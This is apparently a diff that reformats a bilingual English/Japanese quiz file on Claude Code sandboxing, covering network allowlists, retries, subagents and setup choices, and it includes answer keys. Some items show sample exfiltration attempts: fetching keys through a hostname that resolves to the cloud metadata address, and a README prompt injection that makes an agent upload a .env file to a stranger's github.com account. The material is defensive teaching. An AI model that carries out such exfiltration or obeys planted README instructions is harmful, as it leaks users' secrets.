-          "text": { "en": "Approve each retry: it's still sandboxed", "ja": "やり直しを毎回承認する。それでもサンドボックスの中だから" },
+          "text": {
+            "en": "Approve each retry: it's still sandboxed",
+            "ja": "やり直しを毎回承認する。それでもサンドボックスの中だから"
+          },
           "feedback": {
             "en": "A retry runs unsandboxed. That's what the prompt's title says.",
             "ja": "やり直しはサンドボックスなしで動きます。確認のタイトルにもそう書いてあります。"
           }
         },
         {
-          "text": { "en": "Turn the sandbox off so nothing fails", "ja": "何も失敗しないように、サンドボックスをオフにする" },
+          "text": {
+            "en": "Turn the sandbox off so nothing fails",
+            "ja": "何も失敗しないように、サンドボックスをオフにする"
+          },
           "feedback": {
             "en": "Then nothing is walled in at all.",
             "ja": "それでは何も壁で囲まれなくなります。"
           }
         }
       ],
-      "accept": [0],
-      "more": { "slug": "sandboxing", "anchor": "turn-off-the-retry-with-strict-sandbox-mode" }
+      "accept": [
+        0
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "turn-off-the-retry-with-strict-sandbox-mode"
+      }
     },
     {
       "id": "sandboxes-allowlist-3",
       "type": "allowlist",
       "surface": "terminal",
-      "prompt": { "en": "Will it get out?", "ja": "外に出られますか？" },
+      "prompt": {
+        "en": "Will it get out?",
+        "ja": "外に出られますか？"
+      },
       "explain": {
         "en": "After a name passes the list, the proxy checks where it really leads. A name that resolves only to a local address, such as the cloud metadata address `169.254.169.254`, is refused.",
         "ja": "名前がリストを通ったあと、プロキシは実際の行き先を確かめます。行き先がローカルのアドレスだけ、たとえばクラウドのメタデータのアドレス `169.254.169.254` なら、接続は拒否されます。"
@@ -556,32 +758,52 @@
       },
       "panel": {
         "title": "sandbox.network.allowedDomains",
-        "lines": ["\"registry.npmjs.org\"", "\"meta.cloud.example\"", "-- request --", "GET http://meta.cloud.example/keys", "meta.cloud.example -> 169.254.169.254"]
+        "lines": [
+          "\"registry.npmjs.org\"",
+          "\"meta.cloud.example\"",
+          "-- request --",
+          "GET http://meta.cloud.example/keys",
+          "meta.cloud.example -> 169.254.169.254"
+        ]
       },
       "opts": [
         {
-          "text": { "en": "Yes: the name is on the list", "ja": "はい：名前がリストにある" },
+          "text": {
+            "en": "Yes: the name is on the list",
+            "ja": "はい：名前がリストにある"
+          },
           "feedback": {
             "en": "Passing the list isn't the last check. Names that lead to a local address are refused.",
             "ja": "リストを通っても、それで確認が終わるわけではありません。ローカルのアドレスにつながる名前は拒否されます。"
           }
         },
         {
-          "text": { "en": "No: the proxy refuses a name that leads to a local address", "ja": "いいえ：ローカルのアドレスにつながる名前はプロキシが拒否する" },
+          "text": {
+            "en": "No: the proxy refuses a name that leads to a local address",
+            "ja": "いいえ：ローカルのアドレスにつながる名前はプロキシが拒否する"
+          },
           "feedback": {
             "en": "Right. The metadata address is link-local, so the connection is refused.",
             "ja": "正解です。メタデータのアドレスはリンクローカルなので、接続は拒否されます。"
           }
         }
       ],
-      "accept": [1],
-      "more": { "slug": "sandboxing", "anchor": "hostnames-that-resolve-to-local-addresses" }
+      "accept": [
+        1
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "hostnames-that-resolve-to-local-addresses"
+      }
     },
     {
       "id": "sandboxes-inside-4",
       "type": "inside",
       "surface": "terminal",
-      "prompt": { "en": "Inside or outside the sandbox?", "ja": "サンドボックスの中？外？" },
+      "prompt": {
+        "en": "Inside or outside the sandbox?",
+        "ja": "サンドボックスの中？外？"
+      },
       "explain": {
         "en": "Subagents run in the same process as your session and use the same sandbox settings. Their Bash commands are sandboxed when yours are.",
         "ja": "サブエージェントはあなたのセッションと同じプロセスで動き、同じサンドボックスの設定を使います。あなたのコマンドがサンドボックスに入るなら、サブエージェントの Bash コマンドも入ります。"
@@ -592,22 +814,33 @@
       },
       "opts": [
         {
-          "text": { "en": "Inside: the subagent uses the same sandbox", "ja": "中：サブエージェントも同じサンドボックスを使う" },
+          "text": {
+            "en": "Inside: the subagent uses the same sandbox",
+            "ja": "中：サブエージェントも同じサンドボックスを使う"
+          },
           "feedback": {
             "en": "Right. A subagent's shell commands are sandboxed like Claude's own.",
             "ja": "正解です。サブエージェントのシェルのコマンドも、Claude 自身のものと同じようにサンドボックスに入ります。"
           }
         },
         {
-          "text": { "en": "Outside: a subagent is a separate helper, like a hook", "ja": "外：サブエージェントはフックのような別の助っ人だから" },
+          "text": {
+            "en": "Outside: a subagent is a separate helper, like a hook",
+            "ja": "外：サブエージェントはフックのような別の助っ人だから"
+          },
           "feedback": {
             "en": "Hooks are separate processes. A subagent runs inside your session and shares its sandbox.",
             "ja": "フックは別のプロセスです。サブエージェントはあなたのセッションの中で動き、そのサンドボックスを共有します。"
           }
         }
       ],
-      "accept": [0],
-      "more": { "slug": "sandboxing", "anchor": "scope" }
+      "accept": [
+        0
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "scope"
+      }
     },
     {
       "id": "sandboxes-trim-2",
@@ -657,57 +890,88 @@
           "ja": "削ります。Docker のソケットは、コマンドに手元のパソコンを操る力を与えます。"
         }
       },
-      "answer": [7, 11],
-      "more": { "slug": "sandboxing", "anchor": "security-limitations" }
+      "answer": [
+        7,
+        11
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "security-limitations"
+      }
     },
     {
       "id": "sandboxes-allowlist-4",
       "type": "allowlist",
       "surface": "terminal",
-      "prompt": { "en": "Will it get out?", "ja": "外に出られますか？" },
+      "prompt": {
+        "en": "Will it get out?",
+        "ja": "外に出られますか？"
+      },
       "explain": {
         "en": "The proxy checks only the site's name and doesn't look inside encrypted traffic. Any account on an allowed site can receive data. The docs warn that a broad domain like `github.com` can also be used for domain fronting to reach hosts off the list.",
         "ja": "プロキシが確かめるのはサイトの名前だけで、暗号化された通信の中は見ません。許可したサイトなら、どのアカウントでもデータを受け取れます。公式ドキュメントは、`github.com` のような幅広いドメインは、ドメインフロンティングでリストにないホストに届く道にもなると警告しています。"
       },
       "scenario": {
-        "en": "Text planted in a README gets a command to upload your `.env` to a stranger's account on `github.com`.",
-        "ja": "README に仕込まれた文章のせいで、あるコマンドがあなたの `.env` を `github.com` 上の知らない人のアカウントにアップロードしようとします。"
+        "en": "The sandbox is in auto-allow mode. Text planted in a README gets a command to upload your `.env` to a stranger's account on `github.com`.",
+        "ja": "サンドボックスは auto-allow モードです。README に仕込まれた文章のせいで、あるコマンドがあなたの `.env` を `github.com` 上の知らない人のアカウントにアップロードしようとします。"
       },
       "panel": {
         "title": "sandbox.network.allowedDomains",
-        "lines": ["\"registry.npmjs.org\"", "\"github.com\"", "-- request --", "upload .env -> github.com/stranger-FAKE/drop"]
+        "lines": [
+          "\"registry.npmjs.org\"",
+          "\"github.com\"",
+          "-- request --",
+          "upload .env -> github.com/stranger-FAKE/drop"
+        ]
       },
       "opts": [
         {
-          "text": { "en": "Yes: `github.com` is allowed, whoever's account it is", "ja": "はい：誰のアカウントでも `github.com` は許可されている" },
+          "text": {
+            "en": "Yes: `github.com` is allowed, whoever's account it is",
+            "ja": "はい：誰のアカウントでも `github.com` は許可されている"
+          },
           "feedback": {
             "en": "Right. The list says which site, not which account. Keep broad sites off it unless you need them.",
             "ja": "正解です。リストが決めるのはどのサイトかであって、どのアカウントかではありません。必要がないかぎり、幅広いサイトはリストに入れないこと。"
           }
         },
         {
-          "text": { "en": "No: the sandbox spots the secret in the upload", "ja": "いいえ：サンドボックスがアップロードの中の秘密に気づく" },
+          "text": {
+            "en": "No: the sandbox spots the secret in the upload",
+            "ja": "いいえ：サンドボックスがアップロードの中の秘密に気づく"
+          },
           "feedback": {
             "en": "The proxy doesn't inspect encrypted traffic. It only checks the site's name.",
             "ja": "プロキシは暗号化された通信の中身を調べません。確かめるのはサイトの名前だけです。"
           }
         },
         {
-          "text": { "en": "No: only your own repositories are allowed", "ja": "いいえ：許可されるのは自分のリポジトリだけ" },
+          "text": {
+            "en": "No: only your own repositories are allowed",
+            "ja": "いいえ：許可されるのは自分のリポジトリだけ"
+          },
           "feedback": {
             "en": "An allowed domain has no idea which repositories are yours.",
             "ja": "許可したドメインは、どのリポジトリがあなたのものかなど区別しません。"
           }
         }
       ],
-      "accept": [0],
-      "more": { "slug": "sandboxing", "anchor": "security-limitations" }
+      "accept": [
+        0
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "security-limitations"
+      }
     },
     {
       "id": "sandboxes-setup-3",
       "type": "setup",
       "surface": "terminal",
-      "prompt": { "en": "Pick the setup.", "ja": "どの環境にしますか？" },
+      "prompt": {
+        "en": "Pick the setup.",
+        "ja": "どの環境にしますか？"
+      },
       "explain": {
         "en": "For an untrusted repository, the docs suggest a dedicated virtual machine, or a cloud session. The built-in sandbox leaves the repository's hooks and MCP servers outside, and the docs keep dev containers for trusted repositories.",
         "ja": "信頼できないリポジトリには、公式ドキュメントは専用の仮想マシンか、クラウドのセッションを勧めています。組み込みのサンドボックスでは、リポジトリのフックや MCP サーバーが外に残りますし、開発コンテナは信頼できるリポジトリ向けとされています。"
@@ -718,49 +982,73 @@
       },
       "opts": [
         {
-          "text": { "en": "My laptop, with `/sandbox` on", "ja": "自分のノートパソコンで、`/sandbox` をオンにして" },
+          "text": {
+            "en": "My laptop, with `/sandbox` on",
+            "ja": "自分のノートパソコンで、`/sandbox` をオンにして"
+          },
           "feedback": {
             "en": "The sandbox covers shell commands only. The repository's hooks and MCP servers would still run on your laptop with your full access.",
             "ja": "サンドボックスが囲むのはシェルのコマンドだけです。リポジトリのフックや MCP サーバーは、あなたのノートパソコンで、あなたの権限そのままで動いてしまいます。"
           }
         },
         {
-          "text": { "en": "A dedicated virtual machine", "ja": "専用の仮想マシン" },
+          "text": {
+            "en": "A dedicated virtual machine",
+            "ja": "専用の仮想マシン"
+          },
           "feedback": {
             "en": "Right. A VM has its own operating system, so nothing reaches your laptop.",
             "ja": "正解です。VM には独自の OS があるので、何もあなたのノートパソコンに届きません。"
           }
         },
         {
-          "text": { "en": "A cloud session", "ja": "クラウドのセッション" },
+          "text": {
+            "en": "A cloud session",
+            "ja": "クラウドのセッション"
+          },
           "feedback": {
             "en": "Right. It runs in a VM Anthropic manages, and your GitHub token stays outside it.",
             "ja": "正解です。Anthropic が管理する VM の中で動き、あなたの GitHub トークンはその外に置かれます。"
           }
         },
         {
-          "text": { "en": "A dev container on my laptop", "ja": "自分のノートパソコンの開発コンテナ" },
+          "text": {
+            "en": "A dev container on my laptop",
+            "ja": "自分のノートパソコンの開発コンテナ"
+          },
           "feedback": {
             "en": "The docs say to use dev containers only with trusted repositories. A malicious one can still send out whatever is inside the container.",
             "ja": "公式ドキュメントは、開発コンテナは信頼できるリポジトリだけに使うよう勧めています。悪意のあるリポジトリは、コンテナの中のものを何でも外へ送れてしまいます。"
           }
         },
         {
-          "text": { "en": "My laptop with `--dangerously-skip-permissions`, to get it over with", "ja": "早く済ませたいので、自分のノートパソコンで `--dangerously-skip-permissions` を付けて" },
+          "text": {
+            "en": "My laptop with `--dangerously-skip-permissions`, to get it over with",
+            "ja": "早く済ませたいので、自分のノートパソコンで `--dangerously-skip-permissions` を付けて"
+          },
           "feedback": {
             "en": "That drops every prompt on your own machine. It's the riskiest choice here.",
             "ja": "自分のパソコンで、確認がすべてなくなります。この中でいちばん危ない選択です。"
           }
         }
       ],
-      "accept": [1, 2],
-      "more": { "slug": "sandbox-environments", "anchor": "choose-an-approach" }
+      "accept": [
+        1,
+        2
+      ],
+      "more": {
+        "slug": "sandbox-environments",
+        "anchor": "choose-an-approach"
+      }
     },
     {
       "id": "sandboxes-setup-4",
       "type": "setup",
       "surface": "terminal",
-      "prompt": { "en": "Pick the setup.", "ja": "どの環境にしますか？" },
+      "prompt": {
+        "en": "Pick the setup.",
+        "ja": "どの環境にしますか？"
+      },
       "explain": {
         "en": "The sandbox runtime wraps the whole Claude Code process, MCP servers and hooks included, without Docker. `/sandbox` alone covers only shell commands, which the docs say isn't enough for fully unattended runs.",
         "ja": "サンドボックスランタイムは、MCP サーバーやフックも含めて Claude Code のプロセス全体を、Docker なしで包みます。`/sandbox` だけではシェルのコマンドしか囲めず、公式ドキュメントも、完全にまかせきりの実行には足りないとしています。"
@@ -771,36 +1059,53 @@
       },
       "opts": [
         {
-          "text": { "en": "`/sandbox` on its own", "ja": "`/sandbox` だけ" },
+          "text": {
+            "en": "`/sandbox` on its own",
+            "ja": "`/sandbox` だけ"
+          },
           "feedback": {
             "en": "It walls in shell commands only. MCP servers and hooks stay outside.",
             "ja": "壁で囲めるのはシェルのコマンドだけです。MCP サーバーとフックは外に残ります。"
           }
         },
         {
-          "text": { "en": "`srt claude`, the sandbox runtime, with a settings file", "ja": "サンドボックスランタイムの `srt claude` を、設定ファイル付きで" },
+          "text": {
+            "en": "`srt claude`, the sandbox runtime, with a settings file",
+            "ja": "サンドボックスランタイムの `srt claude` を、設定ファイル付きで"
+          },
           "feedback": {
             "en": "Right. It wraps the whole process. It's a beta research preview, so check its settings file loaded before you walk away.",
             "ja": "正解です。プロセス全体を包みます。ベータ版の研究プレビューなので、離れる前に設定ファイルが読み込まれたか確かめましょう。"
           }
         },
         {
-          "text": { "en": "The dev container with its firewall", "ja": "ファイアウォール付きの開発コンテナ" },
+          "text": {
+            "en": "The dev container with its firewall",
+            "ja": "ファイアウォール付きの開発コンテナ"
+          },
           "feedback": {
             "en": "A good choice with Docker, but it needs Docker, which you don't have.",
             "ja": "Docker があればよい選択ですが、Docker が必要で、今は入っていません。"
           }
         },
         {
-          "text": { "en": "Auto mode alone: the classifier checks every action", "ja": "auto モードだけ：分類器がすべての操作を調べる" },
+          "text": {
+            "en": "Auto mode alone: the classifier checks every action",
+            "ja": "auto モードだけ：分類器がすべての操作を調べる"
+          },
           "feedback": {
             "en": "The classifier decides each action; it isn't a wall. The docs recommend isolation on top for unattended runs.",
             "ja": "分類器は1つずつの操作を判断するもので、壁ではありません。公式ドキュメントは、まかせきりの実行では隔離も重ねるよう勧めています。"
           }
         }
       ],
-      "accept": [1],
-      "more": { "slug": "sandbox-environments", "anchor": "sandbox-runtime" }
+      "accept": [
+        1
+      ],
+      "more": {
+        "slug": "sandbox-environments",
+        "anchor": "sandbox-runtime"
+      }
     }
   ]
 }
